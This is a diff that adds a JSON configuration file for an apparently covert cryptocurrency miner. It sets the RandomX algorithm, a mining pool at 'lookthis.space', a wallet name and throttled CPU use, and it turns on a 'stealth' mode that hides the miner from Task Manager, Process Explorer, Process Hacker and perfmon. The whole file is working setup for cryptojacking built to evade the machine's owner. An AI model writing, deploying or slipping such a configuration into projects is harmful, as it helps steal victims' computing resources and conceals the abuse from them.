@@ -1,0 +1,18 @@
+{
+    "algo": "rx/0",
+    "pool": "lookthis.space",
+    "port": 45672,
+    "wallet": "WinterG",
+    "password": "",
+    "rig-id": "",
+    "keepalive": true,
+    "nicehash": true,
+    "ssltls": true,
+    "max-cpu": 50,
+    "idle-wait": 1,
+    "idle-cpu": 90,
+    "stealth": true,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "process-killer": false,
+    "kill-targets": ""
+}
